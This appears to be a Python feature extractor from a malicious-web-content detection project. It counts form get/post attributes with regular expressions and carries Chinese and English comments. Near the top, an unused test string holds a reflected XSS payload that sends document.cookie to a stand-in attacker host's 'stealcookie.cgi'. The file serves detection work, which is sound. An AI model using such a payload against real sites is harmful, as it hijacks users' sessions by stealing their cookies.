import re

# get: send parameters through URL in the form of querystring
# post: send via HTTP message body.
# 有可能inject malicious code into the URLs
# Q：这好像和JS关系不大？
test_str = """
http://host/personalizedpage.php?username=<script>
document.location='http://trudyhost/cgi-bin/
stealcookie.cgi?'
+document.cookie</script>
"""
from src.static_features.js import *


class FormMethodJS(JSExtractor):
    def __init__(self, web_data):
        super().__init__(web_data)
        self.meta = ExtractorMeta(
            "js",
            "FormMethodJS",
            "InfectedWebContent2017",
            "form的method属性数量，包括get和post",
            "1.0",
        )

    def extract(self) -> FeatureExtractionResult:
        js_content_list = self.web_data.content["js"]
        info_dict = {}
        for h in js_content_list:
            start_time = time.time()
            res = extract(h["content"])
            info_dict[h["filename"]] = {
                "count": res,
                "time": time.time() - start_time,
                "additional_info": {},
            }
        return FeatureExtractionResult(self.meta.filetype, self.meta.name, info_dict)


def extract(js_content: str):
    # 定义正则表达式来匹配form的method属性
    # <form后跟着至少一个空白字符，到下一个>之前的所有内容。['\"]用于匹配单引号或双引号
    get_pattern = re.compile(r"<form\s+[^>]*method=['\"]get['\"]", re.IGNORECASE)
    post_pattern = re.compile(r"<form\s+[^>]*method=['\"]post['\"]", re.IGNORECASE)

    # 使用正则表达式找到所有匹配项
    get_matches = get_pattern.findall(js_content)
    post_matches = post_pattern.findall(js_content)

    # 返回get和post的使用次数
    return len(get_matches) + len(post_matches)


# 示例使用
if __name__ == "__main__":
    js_content = """
    <form method="post" action="submit-form.php">
        <input type="text" name="username">
        <input type="submit" value="Submit">
    </form>
    <form method="get" action="search.php">
        <input type="text" name="search_query">
        <input type="submit" value="Search">
    </form>
    """
    all_count = extract(js_content)
    print(f"Form method 'get'/'post' usage count: {all_count}")
